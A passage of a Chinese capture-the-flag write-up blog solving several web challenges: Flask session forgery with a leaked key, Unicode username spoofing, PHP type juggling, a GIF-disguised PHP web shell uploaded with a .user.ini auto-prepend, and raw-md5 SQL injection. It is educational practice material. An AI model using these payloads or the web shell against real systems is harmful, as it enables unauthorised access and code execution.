class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#登陆</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/logout&#x27;</span></span>)\t\t</span><span class=\"comment\">#登出</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logout</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/change&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#修改密码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/edit&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#编辑信息</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>():</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解法一：flask-session伪造\"><a href=\"#解法一：flask-session伪造\" class=\"headerlink\" title=\"解法一：flask session伪造\"></a>解法一：flask session伪造</h2><p>这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。</p>\n<p>贴两篇相关文章：</p>\n<p><a href=\"https://xz.aliyun.com/t/3569\">Python Web之flask session&amp;格式化字符串漏洞</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/client-session-security.html#\">客户端 session 导致的安全问题</a></p>\n<p>首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。</p>\n<p>说明一下flask的session值加密格式是：<code>SECRET_KEY</code> +<code>一个用户对象的字符串</code>(就像PHP里的序列化后)。<code>SECRET_KEY</code>的值我们可以在源码里找到：<a href=\"https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py%E4%B8%AD%E7%9A%84%E7%AC%AC%E5%9B%9B%E8%A1%8C\">https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>可以得知<code>SECRET_KEY</code>值为<code>ckj123</code>。然后在index.html页面发现只要session[‘name’] == ‘admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。</p>\n<p>如下 <a href=\"https://www.leavesongs.com/\"><strong>P师傅</strong></a> 的程序解密：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask.sessions <span class=\"keyword\">import</span> session_json_serializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> itsdangerous <span class=\"keyword\">import</span> base64_decode</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decryption</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    payload, sig = payload.rsplit(<span class=\"string\">b&#x27;.&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    payload, timestamp = payload.rsplit(<span class=\"string\">b&#x27;.&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    decompress = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.startswith(<span class=\"string\">b&#x27;.&#x27;</span>):</span><br><span class=\"line\">        payload = payload[<span class=\"number\">1</span>:]</span><br><span class=\"line\">        decompress = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        payload = base64_decode(payload)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class=\"line\">                         <span class=\"string\">&#x27;an exception&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> decompress:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            payload = zlib.decompress(payload)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class=\"line\">                             <span class=\"string\">&#x27;decoding the payload&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> session_json_serializer.loads(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(decryption(sys.argv[<span class=\"number\">1</span>].encode()))</span><br></pre></td></tr></table></figure>\n\n<p>执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#x27;, &#x27;csrf_token&#x27;: b&#x27;895783633ba12f15aedff2c4b355f0e9cb3158ee&#x27;, &#x27;image&#x27;: b&#x27;AYHD&#x27;, &#x27;name&#x27;: &#x27;guobang&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们需要吧<code>name</code>的值修改为<code>admin</code>。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：<a href=\"https://github.com/noraj/flask-session-cookie-manager\">flask-session-cookie-manager</a></p>\n<blockquote>\n<p>这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号<code>&quot;&quot;</code>括起来</p>\n<p>python flask_session_cookie_manager{2,3}.py {encode,decode}</p>\n<p>-s “SECRET_KEY”                        都需要使用<br>-c “Session cookie value”                session的值      只有解密decode用得到<br>-t “Session cookie structure”          cookie结构    只有encode用得</p>\n</blockquote>\n<p>执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&#x27;, &#x27;csrf_token&#x27;: b&#x27;895783633ba12f15aedff2c4b355f0e9cb3158ee&#x27;, &#x27;image&#x27;: b&#x27;AYHD&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg</span><br></pre></td></tr></table></figure>\n\n<p>放在请求头中，格式为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cookie: session=加密内容</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210306103214.png\"></p>\n<h2 id=\"解法二：Unicode欺骗\"><a href=\"#解法二：Unicode欺骗\" class=\"headerlink\" title=\"解法二：Unicode欺骗\"></a>解法二：Unicode欺骗</h2><p>第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为</p>\n<blockquote>\n<p>ᴬᴰᴹᴵᴺ——注册后——&gt;ADMIN—修改密码—&gt;admin</p>\n</blockquote>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ᴬᴰᴹᴵᴺ</span><br></pre></td></tr></table></figure>\n\n<p>注册以后使用<code>ᴬᴰᴹᴵᴺ</code>登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。</p>\n<hr>\n<h1 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png\">网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示</p>\n<blockquote>\n<p>Only Cuit’s students can buy the FLAG</p>\n</blockquote>\n<p>应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--</span><br><span class=\"line\">\t~~~post money and password~~~</span><br><span class=\"line\">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class=\"line\">\t$password = $_POST[&#x27;password&#x27;];</span><br><span class=\"line\">\tif (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\techo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class=\"line\">\t&#125;elseif ($password == 404) &#123;</span><br><span class=\"line\">\t\techo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还记得php<code>==</code>关系运算会强制转换类型，用POST传一个password=404a，<code>404a</code>会被强制转换为<code>404</code>，密码就对上了。接下来是钱的问题，flag需要<strong>100000000</strong>块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，<code>10e10</code>，就是10的10次方，通过。最终的请求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /pay.php HTTP/1.1</span><br><span class=\"line\">Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn</span><br><span class=\"line\">Content-Length: 25</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: user=1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">password=404a&amp;money=10e10</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201103750.png\"></p>\n<p>知识点</p>\n<blockquote>\n<p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.</p>\n</blockquote>\n<p>准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">auto_prepend_file=233.gif</span><br></pre></td></tr></table></figure>\n\n<p>接下来上传图片马，尝试了正常上传PHP马会提示：</p>\n<blockquote>\n<? in contents!\n</blockquote>\n<p>所以使用script马执行php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上传成功后会提示文件路径：</p>\n<blockquote>\n<p>Your dir uploads/852aff287f54bca0ed7757a702913e50<br>Your files :<br>array(5) { [0]=&gt; string(1) “.” [1]=&gt; string(2) “..” [2]=&gt; string(9) “.user.ini” [3]=&gt; string(7) “233.gif” [4]=&gt; string(9) “index.php” }</p>\n</blockquote>\n<p>这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(‘cat /flag’)。</p>\n<hr>\n<h1 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201105021.png\"></p>\n<p>参考：</p>\n<blockquote>\n<p><a href=\"'https://www.jianshu.com/p/12125291f50d\">【Jarvis OJ】Login–password=’”.md5($pass,true).”</a></p>\n<p><a href=\"https://blog.csdn.net/March97/article/details/81222922\">sql注入：md5($password,true)</a></p>\n<p><a href=\"http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/\">Leet More 2010 Oh Those Admins! writeup</a></p>\n</blockquote>\n<p>随便输入一些东西都没有反应，在请求头中发现了一个Hint：</p>\n<blockquote>\n<p>select * from ‘admin’ where password=md5($pass,true)</p>\n</blockquote>\n<p><strong>语法</strong></p>\n<p><strong>md5(string,raw)</strong></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>string</td>\n<td>必需。要计算的字符串。</td>\n</tr>\n<tr>\n<td>raw</td>\n<td>可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td>\n</tr>\n</tbody></table>\n<p>概括理解，这里如果raw参数为<code>true</code>的话，这个函数的返回值是<code>string</code>的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是<code>ffifdyop</code>，我们来对它进行一波操作</p>\n<ul>\n<li><p>源字符串：ffifdyop</p>\n</li>\n<li><p>md5加密值：276f722736c95d99e921722cf9ed621c</p>\n</li>\n<li><p>hex解码：’or’6É].é!r,ùíb.</p>\n</li>\n</ul>\n<p>最后那几个应该是不可见字符，重要的是前面一段：<code>&#39;or&#39;6</code>，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个<code>&#39;</code>单引号。执行以后真正的sql语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from &#x27;admin&#x27; where password=&#x27;&#x27;or&#x27;6É].é!r,ùíb.‘</span><br></pre></td></tr></table></figure>\n\n<p>可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：</p>\n<blockquote>\n<p>a string starting with a <code>1</code> is cast as an integer when used as a boolean.</p>\n<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。</p>\n</blockquote>\n<p>自己进行的测试：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113825.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210201113839.png\"></p>\n<p>所以真正的解法是只要sql语句的格式为password=’xxxxxxxx’ or ‘1xxxx’，即hex包含字符串”276f722731”（’or’1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。</p>\n<p>下面这个程序是这道题开头参考列表中的第三个链接。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">for ($i = 0;;) &#123; </span><br><span class=\"line\"> for ($c = 0; $c &lt; 1000000; $c++, $i++)</span><br><span class=\"line\">  if (stripos(md5($i, true), &#x27;\\&#x27;or\\&#x27;&#x27;) !== false)</span><br><span class=\"line\">   echo &quot;\\nmd5($i) = &quot; . md5($i, true) . &quot;\\n&quot;;</span><br><span class=\"line\"> echo &quot;.&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这个程序遍历数字进行md5加密，使用stripos匹配是否有<code>&#39;or&#39;</code>，这个函数有一个弊病就是如果是以<code>&#39;or&#39;</code>开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由<code>\\&#39;or\\&#39;</code>改为<code>&#39;or&#39;([1-9]+|0+[1-9])</code><span class=\"heimu\"> 不过我的方法自己还没跑出来🤣，回头加个多线程试一试</span></p>\n<p>（更新）</p>\n<p>自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210203094304.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">找到了md5(2413633098): </span><br><span class=\"line\">找到了md5(5207660362): </span><br><span class=\"line\">找到了md5(8351555222): </span><br><span class=\"line\">找到了md5(13095770027): </span><br><span class=\"line\">找到了md5(14860117901): </span><br><span class=\"line\">找到了md5(15724086109): </span><br><span class=\"line\">找到了md5(16529176061): </span><br><span class=\"line\">找到了md5(17428338265): </span><br><span class=\"line\">找到了md5(18717303578):</span><br><span class=\"line\">找到了md5(19342380396): </span><br><span class=\"line\">找到了md5(23960028257): </span><br><span class=\"line\">找到了md5(32561902614): </span><br><span class=\"line\">找到了md5(38983153698): </span><br><span class=\"line\">找到了md5(39742292223): </span><br><span class=\"line\">找到了md5(44120894060): </span><br><span class=\"line\">找到了md5(44820604888): </span><br><span class=\"line\">找到了md5(45570673322): </span><br><span class=\"line\">找到了md5(45855250502): </span><br><span class=\"line\">找到了md5(53660569009): </span><br><span class=\"line\">找到了md5(55098175010): </span><br><span class=\"line\">找到了md5(59763304323): </span><br><span class=\"line\">找到了md5(60185044906): </span><br><span class=\"line\">找到了md5(68625783421): </span><br><span class=\"line\">找到了md5(70949326264): </span><br><span class=\"line\">(md5值删了，因为乱码会影响博客的搜索功能)</span><br></pre></td></tr></table></figure>\n\n<p>程序源码如下（自己写着玩，轻喷）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># codeing = utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">import threading</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">import re</span><br><span class=\"line\">import itertools</span><br><span class=\"line\">import time</span><br><span class=\"line\"># r&#x27;\\&#x27;or\\&#x27;([1-9]+|0+[1-9])&#x27;</span><br><span class=\"line\"># r&#x27;\\&#x27;or\\&#x27;&#x27;</span><br><span class=\"line\">pattern=re.compile(r&#x27;\\&#x27;or\\&#x27;([1-9]+|0+[1-9])&#x27;,re.I)</span><br><span class=\"line\">item = itertools.count(1)</span><br><span class=\"line\"></span><br><span class=\"line\">def thrfunc():</span><br><span class=\"line\">    while 1:</span><br><span class=\"line\">        s2 = &#x27;&#x27;</span><br><span class=\"line\">        temp = str(next(item))</span><br><span class=\"line\">        s1 = hashlib.md5(temp.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class=\"line\">        for i in range(0, len(s1), 2):</span><br><span class=\"line\">            s2 = s2 + chr(int(s1[i:i + 2], 16))</span><br><span class=\"line\">        if re.search(pattern, s2):</span><br><span class=\"line\">            print(&quot;找到了md5(&quot; + temp + &quot;): &quot; + s2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">threads=[]</span><br><span class=\"line\">for i in range(10):</span><br><span class=\"line\">    t = threading.Thread(target=thrfunc)</span><br><span class=\"line\">    threads.append(t)</span><br><span class=\"line\">    t.start()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。</p>\n<p>还有一个能用的md5值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n\n<p>以上是第一层。<strong>其实看了源码里只验证了字符串是否等于<code>ffifdyop</code>我写的脚本里的值肯定通过不了</strong></p>\n<p>第二层可以直接在源码中看到注释。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = $GET[&#x27;a&#x27;];</span><br><span class=\"line\">$b = $_GET[&#x27;b&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class=\"line\">    // wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>\n\n<p>简单的md5以0E开头</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure>\n\n<p>第三层</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include 